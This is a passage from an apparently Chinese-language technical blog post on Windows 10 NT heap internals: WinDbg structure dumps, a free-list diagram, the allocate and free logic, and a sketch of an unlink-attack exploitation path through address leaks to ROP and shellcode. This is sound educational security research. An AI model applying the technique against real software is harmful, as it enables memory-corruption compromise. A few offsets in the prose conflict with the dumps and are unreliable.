+<span class="number">0x000</span> Segment          : _HEAP_SEGMENT</span><br><span class="line">    +<span class="number">0x000</span> Entry            : _HEAP_ENTRY</span><br><span class="line">    +<span class="number">0x010</span> SegmentSignature : Uint4B</span><br><span class="line">    +<span class="number">0x014</span> SegmentFlags     : Uint4B</span><br><span class="line">    +<span class="number">0x018</span> SegmentListEntry : _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x028</span> Heap             : Ptr64 _HEAP</span><br><span class="line">    +<span class="number">0x030</span> BaseAddress      : Ptr64 Void</span><br><span class="line">    +<span class="number">0x038</span> NumberOfPages    : Uint4B</span><br><span class="line">    +<span class="number">0x040</span> FirstEntry       : Ptr64 _HEAP_ENTRY</span><br><span class="line">    +<span class="number">0x048</span> LastValidEntry   : Ptr64 _HEAP_ENTRY</span><br><span class="line">    +<span class="number">0x050</span> NumberOfUnCommittedPages : Uint4B</span><br><span class="line">    +<span class="number">0x054</span> NumberOfUnCommittedRanges : Uint4B</span><br><span class="line">    +<span class="number">0x058</span> SegmentAllocatorBackTraceIndex : Uint2B</span><br><span class="line">    +<span class="number">0x05a</span> Reserved         : Uint2B</span><br><span class="line">    +<span class="number">0x060</span> UCRSegmentList   : _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x070</span> Flags            : Uint4B</span><br><span class="line">    +<span class="number">0x074</span> ForceFlags       : Uint4B</span><br><span class="line">    +<span class="number">0x078</span> CompatibilityFlags : Uint4B</span><br><span class="line">    +<span class="number">0x07c</span> EncodeFlagMask   : Uint4B</span><br><span class="line">    +<span class="number">0x080</span> Encoding         : _HEAP_ENTRY</span><br><span class="line">    +<span class="number">0x090</span> Interceptor      : Uint4B</span><br><span class="line">    +<span class="number">0x094</span> VirtualMemoryThreshold : Uint4B</span><br><span class="line">    +<span class="number">0x098</span> Signature        : Uint4B</span><br><span class="line">    +<span class="number">0x0a0</span> SegmentReserve   : Uint8B</span><br><span class="line">    +<span class="number">0x0a8</span> SegmentCommit    : Uint8B</span><br><span class="line">    +<span class="number">0x0b0</span> DeCommitFreeBlockThreshold : Uint8B</span><br><span class="line">    +<span class="number">0x0b8</span> DeCommitTotalFreeThreshold : Uint8B</span><br><span class="line">    +<span class="number">0x0c0</span> TotalFreeSize    : Uint8B</span><br><span class="line">    +<span class="number">0x0c8</span> MaximumAllocationSize : Uint8B</span><br><span class="line">    +<span class="number">0x0d0</span> ProcessHeapsListIndex : Uint2B</span><br><span class="line">    +<span class="number">0x0d2</span> HeaderValidateLength : Uint2B</span><br><span class="line">    +<span class="number">0x0d8</span> HeaderValidateCopy : Ptr64 Void</span><br><span class="line">    +<span class="number">0x0e0</span> NextAvailableTagIndex : Uint2B</span><br><span class="line">    +<span class="number">0x0e2</span> MaximumTagIndex  : Uint2B</span><br><span class="line">    +<span class="number">0x0e8</span> TagEntries       : Ptr64 _HEAP_TAG_ENTRY</span><br><span class="line">    +<span class="number">0x0f0</span> UCRList          : _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x100</span> AlignRound       : Uint8B</span><br><span class="line">    +<span class="number">0x108</span> AlignMask        : Uint8B</span><br><span class="line">    +<span class="number">0x110</span> VirtualAllocdBlocks : _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x120</span> SegmentList      : _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x130</span> AllocatorBackTraceIndex : Uint2B</span><br><span class="line">    +<span class="number">0x134</span> NonDedicatedListLength : Uint4B</span><br><span class="line">    +<span class="number">0x138</span> BlocksIndex      : Ptr64 Void</span><br><span class="line">    +<span class="number">0x140</span> UCRIndex         : Ptr64 Void</span><br><span class="line">    +<span class="number">0x148</span> PseudoTagEntries : Ptr64 _HEAP_PSEUDO_TAG_ENTRY</span><br><span class="line">    +<span class="number">0x150</span> FreeLists        : _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x160</span> LockVariable     : Ptr64 _HEAP_LOCK</span><br><span class="line">    +<span class="number">0x168</span> CommitRoutine    : Ptr64     <span class="keyword">long</span> </span><br><span class="line">    +<span class="number">0x170</span> StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">    +<span class="number">0x178</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">    +<span class="number">0x198</span> FrontEndHeap     : Ptr64 Void</span><br><span class="line">    +<span class="number">0x1a0</span> FrontHeapLockCount : Uint2B</span><br><span class="line">    +<span class="number">0x1a2</span> FrontEndHeapType : UChar</span><br><span class="line">    +<span class="number">0x1a3</span> RequestedFrontEndHeapType : UChar</span><br><span class="line">    +<span class="number">0x1a8</span> FrontEndHeapUsageData : Ptr64 Wchar</span><br><span class="line">    +<span class="number">0x1b0</span> FrontEndHeapMaximumIndex : Uint2B</span><br><span class="line">    +<span class="number">0x1b2</span> FrontEndHeapStatusBitmap : [<span class="number">129</span>] UChar</span><br><span class="line">    +<span class="number">0x238</span> Counters         : _HEAP_COUNTERS</span><br><span class="line">    +<span class="number">0x2b0</span> TuningParameters : _HEAP_TUNING_PARAMETERS</span><br></pre></td></tr></table></figure><p>其中一些在利用中比较重要的成员：</p><ul><li><code>EncodeFlagMask(+0x7C: 4B)</code>：用来标志是否要encode该heap中的chunk头，0x100000表示需要encode。</li><li><code>Encoding(+0x80: 16B)</code>：用来和chunk头进行xor的cookie。</li><li><code>VirtualAllocdBlocks(+0x110: 16B)</code>：一个双向链表的dummy head，存放着<code>Flink</code>和<code>Blink</code>，将VirtualAllocate出来的chunk链接起来。</li><li><code>BlocksIndex(+0x138: 8B)</code>：指向一个<code>_HEAP_LIST_LOOKUP</code>结构（后面会进行介绍）。</li><li><code>FreeList(+0x138 8B)</code>：一个双向链表的dummy head，同样存放着<code>Flink</code>和<code>Blink</code>，将所有的freed chunk给链起来，可以类比于linux ptmalloc下的unsorted bin进行理解；不同的是，它是有序的。</li><li><code>FrontEndHeap(+0x198: 8B)</code>：指向管理Front-End heap的结构体</li><li><code>FrontEndHeapUsageData(+0x1a8: 8B)</code>：指向一个对应各个大小chunk的数组，该数组记录各种大小chunk使用的次数，达到一定数值的时候就会启用Front-End（可以配合前面的示例程序理解）。</li></ul><h3 id="HEAP-ENTRY"><a href="#HEAP-ENTRY" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h3><p>对于每一个使用的堆块，也就是我们常说的chunk，在Win10下就是<code>_HEAP_ENTRY</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _HEAP_ENTRY</span><br><span class="line">ntdll!_HEAP_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> UnpackedEntry    : _HEAP_UNPACKED_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> PreviousBlockPrivateData : Ptr64 Void</span><br><span class="line">    +<span class="number">0x008</span> Size             : Uint2B</span><br><span class="line">    +<span class="number">0x00a</span> Flags            : UChar</span><br><span class="line">    +<span class="number">0x00b</span> SmallTagIndex    : UChar</span><br><span class="line">    +<span class="number">0x008</span> SubSegmentCode   : Uint4B</span><br><span class="line">    +<span class="number">0x00c</span> PreviousSize     : Uint2B</span><br><span class="line">    +<span class="number">0x00e</span> SegmentOffset    : UChar</span><br><span class="line">    +<span class="number">0x00e</span> LFHFlags         : UChar</span><br><span class="line">    +<span class="number">0x00f</span> UnusedBytes      : UChar</span><br><span class="line">    +<span class="number">0x008</span> CompactHeader    : Uint8B</span><br><span class="line">    +<span class="number">0x000</span> ExtendedEntry    : _HEAP_EXTENDED_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> Reserved         : Ptr64 Void</span><br><span class="line">    +<span class="number">0x008</span> FunctionIndex    : Uint2B</span><br><span class="line">    +<span class="number">0x00a</span> ContextValue     : Uint2B</span><br><span class="line">    +<span class="number">0x008</span> InterceptorValue : Uint4B</span><br><span class="line">    +<span class="number">0x00c</span> UnusedBytesLength : Uint2B</span><br><span class="line">    +<span class="number">0x00e</span> EntryOffset      : UChar</span><br><span class="line">    +<span class="number">0x00f</span> ExtendedBlockSignature : UChar</span><br><span class="line">    +<span class="number">0x000</span> ReservedForAlignment : Ptr64 Void</span><br><span class="line">    +<span class="number">0x008</span> Code1            : Uint4B</span><br><span class="line">    +<span class="number">0x00c</span> Code2            : Uint2B</span><br><span class="line">    +<span class="number">0x00e</span> Code3            : UChar</span><br><span class="line">    +<span class="number">0x00f</span> Code4            : UChar</span><br><span class="line">    +<span class="number">0x00c</span> Code234          : Uint4B</span><br><span class="line">    +<span class="number">0x008</span> AgregateCode     : Uint8B</span><br></pre></td></tr></table></figure><p>其中一些比较重要的成员：</p><ul><li><code>PreviousBlockPrivateData(+0x0: 8B)</code>：由于需要对齐0x10，所以这个地方存放的基本上是前一个堆块的数据，和linux ptmalloc类似，只是处于free状态的时候不会作为prev_size使用。</li><li><code>Size(+0x8: 2B)</code>：当前chunk的size，存放的是<code>size &gt;&gt; 4</code>之后的值。</li><li><code>Flags(+0xA: 1B)</code>：当前chunk的标志：0x1表示处于占用状态、0x2表示存在额外描述、0x4表示使用固定模式填充、0x8表示VirtualAlloc、0x10表示为该段最后一个chunk。</li><li><code>SmallTagIndex(+0xB: 1B)</code>：为<code>Size</code>和<code>Flags</code>成员共三字节数据的xor结果，即校验位，用于检查是否被修改。</li><li><code>PreviousSize(+0xC: 2B)</code>：上一个chunk的size，同样存放<code>size &gt;&gt; 4</code>。</li><li><code>SegmentOffset(+0xE: 1B)</code>：某些情况下用来找segment。</li><li><code>UnusedBytes(+0xF: 1B)</code>：在inuse的时候，表示<code>malloc</code>之后剩下的chunk的空间大小，可以用来判断chunk是来自于Front-End还是Back-End；在freed的时候，恒为0。</li></ul><p>另外，用户数据区域在inuse的时候可以进行读写，在freed的时候存放<code>Flink</code>和<code>Blink</code>分别指向前一个和后一个freed chunk；与linux ptmalloc不同的是，这里<code>Flink</code>和<code>Blink</code>指向不是chunk头，而是数据区域。</p><h3 id="HEAP-VIRTUAL-ALLOC-ENTRY"><a href="#HEAP-VIRTUAL-ALLOC-ENTRY" class="headerlink" title="_HEAP_VIRTUAL_ALLOC_ENTRY"></a>_HEAP_VIRTUAL_ALLOC_ENTRY</h3><p>维护通过<code>VirtualAlloc</code>分配出来的chunk，可以类比linux ptmalloc中的mmap chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _HEAP_VIRTUAL_ALLOC_ENTRY</span><br><span class="line">ntdll!_HEAP_VIRTUAL_ALLOC_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> Entry            : _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x010</span> ExtraStuff       : _HEAP_ENTRY_EXTRA</span><br><span class="line">    +<span class="number">0x020</span> CommitSize       : Uint8B</span><br><span class="line">    +<span class="number">0x028</span> ReserveSize      : Uint8B</span><br><span class="line">    +<span class="number">0x030</span> BusyBlock        : _HEAP_ENTRY</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _LIST_ENTRY</span><br><span class="line">MSVCP140!_LIST_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> Flink            : Ptr64 _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x008</span> Blink            : Ptr64 _LIST_ENTRY</span><br></pre></td></tr></table></figure><p>其中一些比较重要的成员：</p><ul><li><code>Entry(+0x0: 16B)</code>：链表的<code>Flink</code>和<code>Blink</code>，分别指向上一个和下一个通过<code>VirtualAlloc</code>分配出来的chunk。</li><li><code>BusyBlock(+0x30: 8B)</code>：与普通的<code>_HEAP_ENTRY</code>头基本一样，不同在于这里的<code>Size</code>是没有使用的size，储存时也没有进行<code>size &gt;&gt; 4</code>的操作，UnusedBytes恒为4。</li></ul><h3 id="HEAP-LIST-LOOKUP"><a href="#HEAP-LIST-LOOKUP" class="headerlink" title="_HEAP_LIST_LOOKUP"></a>_HEAP_LIST_LOOKUP</h3><p><code>_HEAP</code>中<code>BlocksIndex</code>指向的结构体，方便快速寻找到合适的chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _HEAP_LIST_LOOKUP</span><br><span class="line">ntdll!_HEAP_LIST_LOOKUP</span><br><span class="line">    +<span class="number">0x000</span> ExtendedLookup   : Ptr64 _HEAP_LIST_LOOKUP</span><br><span class="line">    +<span class="number">0x008</span> ArraySize        : Uint4B</span><br><span class="line">    +<span class="number">0x00c</span> ExtraItem        : Uint4B</span><br><span class="line">    +<span class="number">0x010</span> ItemCount        : Uint4B</span><br><span class="line">    +<span class="number">0x014</span> OutOfRangeItems  : Uint4B</span><br><span class="line">    +<span class="number">0x018</span> BaseIndex        : Uint4B</span><br><span class="line">    +<span class="number">0x020</span> ListHead         : Ptr64 _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x028</span> ListsInUseUlong  : Ptr64 Uint4B</span><br><span class="line">    +<span class="number">0x030</span> ListHints        : Ptr64 Ptr64 _LIST_ENTRY</span><br></pre></td></tr></table></figure><p>其中一些比较重要的成员：</p><ul><li><code>ExtendedLookup(+0x0: 8B)</code>：指向下一个ExtendedLookup，通常下一个会管理更大的chunk。</li><li><code>ArraySize(+0x8: 4B)</code>：该结构管理的最大chunk的大小，通常为0x80（实际上是<code>0x80 &lt;&lt; 4 = 0x800</code>）。</li><li><code>ItemCount(+0x10: 4B)</code>：目前该结构管理的chunk数目。</li><li><code>OutOfRangeItems(+0x14: 4B)</code>：超出该结构所管理大小的chunk的数量。</li><li><code>BaseIndex(+0x18: 8B)</code>：该结构所管理的chunk的起始index，用来从ListHint中找到合适大小的freed chunk用的。</li><li><code>ListHead(+0x20: 8B)</code>：指向Freelist的dummy head。</li><li><code>ListsInUseUlong(+0x28: 8B)</code>：一个bitmap，用来判断ListHint中是否有合适大小的chunk。</li><li><code>ListHints(+0x20: 8B)</code>：用来指向对应大小的chunk array，该array以0x10大小为间隔，存放一个对应size的freed chunk的地址，用于快速找到合适大小的chunk；可以类比linux ptmalloc的tcache bin，只不过chunk的组织仍然通过双向链表维护。</li></ul><h2 id="空闲chunk的管理"><a href="#空闲chunk的管理" class="headerlink" title="空闲chunk的管理"></a>空闲chunk的管理</h2><p>同样借用Slides中的一张图来说明，结构清晰明朗：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+                     BlocksIndex                                 +----------------------+</span><br><span class="line">|000001...1...1000000000|   +-----------&gt;+-------------------+                            | PreviousBlockPrivate |         </span><br><span class="line">+-----------------------+   |            |        ...        |                            +----------------------+</span><br><span class="line">           ^                |            +-------------------+                            |  Chunk header (0x70) |</span><br><span class="line">           |                             |     ListHead      |-----+  +------------------&gt;+----------------------+</span><br><span class="line">           +--------+       |            +-------------------+     |  |                   |         Flink        |----+</span><br><span class="line">       _HEAP        +-------+------------|  ListsInUseUlong  |--+  |  |                   +----------------------+    |</span><br><span class="line">+------------------+        |            +-------------------+  |  |  |           +-------|         Blink        |    |</span><br><span class="line">|        ...       |        |            |     ListHint      |  |  |  |           |  +---&gt;+----------------------+    |</span><br><span class="line">+------------------+        |            +-------------------+  |  |  |           |  |    |          ...         |    |</span><br><span class="line">|  EncodeFlagMask  |        |                  +----------------+--+  |           |  |    +----------------------+    |</span><br><span class="line">+------------------+        |                  |                |     |           |  |                                |</span><br><span class="line">|     Encoding     |        |                  V                |     |           |  |    +----------------------+    |</span><br><span class="line">+------------------+        |   +-------&gt;+-----------+&lt;---------+-----|-----------+  |    | PreviousBlockPrivate |    |</span><br><span class="line">|        ...       |        |   |        |   Flink   |          |     |              |    +----------------------+</span><br><span class="line">+------------------+        |   |        +-----------+          |     |              |    | Chunk header (0x110) |    |</span><br><span class="line">|   BlocksIndex    |--------+   |        |   Blink   |          |     |     +--------+---&gt;+----------------------+&lt;---+  </span><br><span class="line">+------------------+            |     +-&gt;+-----------+&lt;---------+-----|-----|-----+  |    |         Flink        |----+</span><br><span class="line">|        ...       |            |     |        +----------------+     |     |     |  |    +----------------------+    |</span><br><span class="line">+------------------+------------+     |        |                      |     |     |  +----|         Blink        |    |     </span><br><span class="line">|     FreeList     |                  |        V                      |     |     |  +---&gt;+----------------------+    |</span><br><span class="line">+------------------+------------------+  +-----------+                |     |     |  |    |          ...         |    |</span><br><span class="line">|        ...       |                     |    ...    |                |     |     |  |    +----------------------+    |</span><br><span class="line">+------------------+                     +-----------+                |     |     |  |                                |</span><br><span class="line">                              ListHint[7]|   Flink   |----------------+     |     |  |    +----------------------+    |</span><br><span class="line">                                         +-----------+                      |     |  |    | PreviousBlockPrivate |    |</span><br><span class="line">                                         |    ...    |                      |     |  |    +----------------------+    |      </span><br><span class="line">                                         +-----------+                      |     |  |    | Chunk header (0x160) |    |</span><br><span class="line">                             ListHint[17]|   Flink   |----------------------+  +--+--+---&gt;+----------------------+&lt;---+</span><br><span class="line">                                         +-----------+                         |  |  |    |         Flink        |----+</span><br><span class="line">                                         |    ...    |                         |  |  |    +----------------------+    |</span><br><span class="line">                                         +-----------+                         |  |  +----|         Blink        |    |</span><br><span class="line">                             ListHint[22]|   Flink   |-------------------------+  |       +----------------------+    |</span><br><span class="line">                                         +-----------+                            |       |          ...         |    |</span><br><span class="line">                                         |    ...    |                            |       +----------------------+    |</span><br><span class="line">                                         +-----------+                            +-----------------------------------+</span><br></pre></td></tr></table></figure><h2 id="分配机制"><a href="#分配机制" class="headerlink" title="分配机制"></a>分配机制</h2><h3 id="Allocate-RtlpAllocateHeap"><a href="#Allocate-RtlpAllocateHeap" class="headerlink" title="Allocate (RtlpAllocateHeap)"></a>Allocate (RtlpAllocateHeap)</h3><p>根据size分为三种情况:</p><p><strong>size &lt;= 0x4000</strong><br>基本都会通过<code>RtlpAllocateHeap</code>进行分配：</p><ol><li>首先会看该size对应的FrontEndHeapStatusBitmap是否有启用LFH：<ul><li>如果没有则在对应的<code>FrontEndHeapUsageData += 0x21</code>。</li><li>如果<code>FrontEndHeapUsageData &gt; 0xff00 || FrontEndHeapUsageData &amp; 0x1f &gt; 0x10</code>，那么启用LFH。</li></ul></li><li>接下来会查看对应的ListHint中是否有值（也就是否有对应size的freed chunk）：<ul><li>如果刚好有值，就检查该chunk的Flink是否是同样size的chunk：<ul><li>若是则将Flink写到对应的ListHint中。</li><li>若否则清空对应ListHint，并最后将该chunk从Freelist中unlink出来（Unlink细节后面利用的时候会进行解释）。</li></ul></li><li>如果对应的ListHint中本身就没有值，就从比较大的ListHint中找：<ul><li>如果找到了，就以上述同样的方式处理该ListLink，并unlink该chunk，之后对其进行切割，剩下的重新放入Freelist，如果可以放进ListHint就会放进去，再encode header。</li><li>如果没较大的ListHint也都是空的，那么尝试ExtendedHeap加大堆空间，再从extend出来的chunk拿，接着一样切割，放回ListHIint，encode header。</li></ul></li></ul></li><li>最后将分配到的chunk返回给用户。</li></ol><p><strong>0x4000 &lt; size &lt;= 0xff000</strong><br>除了没有LFH相关操作外，其余都和第一种情况一样。</p><p><strong>size &gt;= 0xff000</strong><br>直接调用<code>ZwAllocateVirtualMemroy</code>进行分配，类似于linux下的mmap直接给一大块地址，并且插入<code>_HEAP-&gt;VirtualAllocdBlocks</code>中。</p><h3 id="Free-RtlpFreeHeap"><a href="#Free-RtlpFreeHeap" class="headerlink" title="Free (RtlpFreeHeap)"></a>Free (RtlpFreeHeap)</h3><p>根据size分为两种情况：</p><p><strong>size &lt;= 0xff000</strong></p><ol><li>首先会检查地址对齐0x10，并通过unused bytes判断该chunk的状态（为0则是free状态，反之则为inuse状态）。</li><li>如果LFH未开启，会将对应的<code>FrontEndHeapUsageData -= 1</code>（并不是0x21）。</li><li>接着判断前后的chunk是否是freed的状态，如果是的话就将前后的freed chunk从Freelist中unlink下来（与上面的方式一样更新ListHint），再进行合并。</li><li>合并完之后更新Size和PreviousSize，然后查看是不是最前跟最后，是就插入，否则就从ListHint中插入，并且update ListHint；插入时也会对Freelist进行检查（<strong>但是此检查不会触发abort，原因在于没有做unlink写入</strong>）。</li></ol><p><strong>size &gt; 0xff000</strong><br>检查该chunk的linked list并从<code>_HEAP-&gt;VirtualAllocdBlocks</code>中移除，接着使用<code>RtlpSecMemFreeVirtualMemory</code>将chunk整个munmap掉。</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>目前看来主要是针对Unlink的利用方式，虽然Windows下对freed chunk的管理比较复杂，但是unlink原理和linux ptmalloc十分类似，所以利用方法也是共通的。<br>主要有两点不同：</p><ol><li>进行decode header然后进行check的时候，需要保证其正确性，比如找到previous freed chunk，进行decode以及check的操作的时候。</li><li>前面也曾提到，windows下chunk的Flink和Blink直接指向数据区域而不是chunk header。</li></ol><p>整体的利用思路为：</p><ol><li>在已知linux下unlink attack的基础上，以完全相同的方式，对windows heap进行unlink attack，可以实现将一个指针指向本身的效果（细节这里不再赘述，Slides的图解十分详细）。</li><li>利用这个指向自身的指针，我们可以控制周围的可能的指针，达到任意地址读写的效果。</li><li>不同于linux下的利用，windows下似乎不存在各种hook函数可以覆盖从而控制程序的执行流，所以只存在两条路，一是ROP，二十写shellcode。</li><li>不论如何，首先需要的是leak出text，各种dll，以及stack地址。<ul><li>text：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PEB --&gt; <span class="built_in">text</span></span><br></pre></td></tr></table></figure></li><li>针对dll：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span> --&gt; IAT --&gt; xxx.dll --&gt; xxx.dll</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">_HEAP-&gt;LockVariable.Lock --&gt; ntdll.dll</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">CrticalSection-&gt;DebugInfo --&gt; ntdll.dll</span><br></pre></td></tr></table></figure></li><li>针对stack：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kernel32.dll --&gt; kernelbase.dll --&gt; KERNELBASE!BasepFilterInfo --&gt; <span class="built_in">stack</span> address <span class="comment">// 高机率会有</span></span><br><span class="line"><span class="comment">// or</span></span><br><span class="line">kernel32.dll --&gt; ntdll.dll --&gt; ntdll!PebLdr --&gt; PEB --&gt; TEB --&gt; <span class="built_in">stack</span> address</span><br></pre></td></tr></table></figure></li></ul></li><li>后面就可以覆盖返回地址做ROP，调<code>VirtualProtect</code>获得执行权限，然后jump到shellcode执行。（个人认为如果可以的话，也能修复Freelist的双向链表，然后ROP直接执行<code>system(&quot;cmd.exe&quot;)</code>）</li></ol><h1 id="Front-End"><a href="#Front-End" class="headerlink" title="Front-End"></a>Front-End</h1><h2 id="一些重要结构体-1"><a href="#一些重要结构体-1" class="headerlink" title="一些重要结构体"></a>一些重要结构体</h2><h3 id="LFH-HEAP"><a href="#LFH-HEAP" class="headerlink" title="_LFH_HEAP"></a>_LFH_HEAP</h3><p>管理Front-End heap的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dt _LFH_HEAP</span><br><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">    +<span class="number">0x000</span> Lock             : _RTL_SRWLOCK</span><br><span class="line">    +<span class="number">0x008</span> SubSegmentZones  : _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x018</span> Heap             : Ptr64 Void</span><br><span class="line">    +<span class="number">0x020</span> NextSegmentInfoArrayAddress : Ptr64 Void</span><br><span class="line">    +<span class="number">0x028</span> FirstUncommittedAddress : Ptr64 Void</span><br><span class="line">    +<span class="number">0x030</span> ReservedAddressLimit : Ptr64 Void</span><br><span class="line">    +<span class="number">0x038</span> SegmentCreate    : Uint4B</span><br><span class="line">    +<span class="number">0x03c</span> SegmentDelete    : Uint4B</span><br><span class="line">    +<span class="number">0x040</span> MinimumCacheDepth : Uint4B</span><br><span class="line">    +<span class="number">0x044</span> CacheShiftThreshold : Uint4B</span><br><span class="line">    +<span class="number">0x048</span> SizeInCache      : Uint8B</span><br><span class="line">    +<span class="number">0x050</span> RunInfo          : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">    +<span class="number">0x060</span> UserBlockCache   : [<span class="number">12</span>] _USER_MEMORY_CACHE_ENTRY</span><br><span class="line">    +<span class="number">0x2a0</span> MemoryPolicies   : _HEAP_LFH_MEM_POLICIES</span><br><span class="line">    +<span class="number">0x2a4</span> Buckets          : [<span class="number">129</span>] _HEAP_BUCKET</span><br><span class="line">    +<span class="number">0x4a8</span> SegmentInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">    +<span class="number">0x8b0</span> AffinitizedInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">    +<span class="number">0xcb8</span> SegmentAllocator : Ptr64 _SEGMENT_HEAP</span><br><span class="line">    +<span class="number">0xcc0</span> LocalData        : [<span class="number">1</span>] _HEAP_LOCAL_DATA</span><br></pre></td></tr></table></figure><p>其中一些比较重要的成员：</p><ul><li><code>Heap(+0x18: 8B)</code>：指向其对应的<code>_HEAP</code>结构体。</li><li><code>Buckets(+0x2A4: 4B * 129)</code>：一个存放129个<code>_HEAP_BUCKET</code>结构体的数组（<code>_HEAP_BUCKET</code>后面会分析），用来寻找配置大小对应到Block大小的阵列结构。</li><li><code>SegmentInfoArrays(+0x4A8: 8B * 129)</code>：一个存放129个<code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体指针的数组（<code>_HEAP_LOCAL_SEGMENT_INFO</code>后面会分析），不同大小对应到不同的<code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体，主要管理对应到的<code>_HEAP_SUBSEGMENT</code>的信息。</li><li><code>LocalData</code>：一个<code>_HEAP_LOCAL_DATA</code>结构体：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dt _HEAP_LOCAL_DATA</span><br><span class="line">ntdll!_HEAP_LOCAL_DATA</span><br><span class="line">    +<span class="number">0x000</span> DeletedSubSegments : _SLIST_HEADER</span><br><span class="line">    +<span class="number">0x010</span> CrtZone          : Ptr64 _LFH_BLOCK_ZONE</span><br><span class="line">    +<span class="number">0x018</span> LowFragHeap      : Ptr64 _LFH_HEAP</span><br><span class="line">    +<span class="number">0x020</span> Sequence         : Uint4B</span><br><span class="line">    +<span class="number">0x024</span> DeleteRateThreshold : Uint4B</span><br></pre></td></tr></table></figure>  其中<code>LowFragHeap</code>指回<code>_LFH_HEAP</code>结构本身的位置，通常用来找回LFH。</li></ul><h3 id="HEAP-BUCKET"><a href="#HEAP-BUCKET" class="headerlink" title="_HEAP_BUCKET"></a>_HEAP_BUCKET</h3><p>结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 